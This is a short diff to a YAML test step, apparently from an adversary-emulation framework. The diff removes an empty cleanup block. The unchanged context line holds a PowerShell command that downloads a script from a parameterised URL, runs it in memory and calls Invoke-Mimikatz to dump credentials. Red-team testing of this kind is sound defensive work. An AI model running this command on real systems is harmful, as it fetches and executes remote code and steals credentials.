@@ -23,6 +23,3 @@ steps:
       inline: |
         powershell.exe "IEX (New-Object Net.WebClient).DownloadString('{{.Args.mimurl}}'); Invoke-Mimikatz -DumpCreds"
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
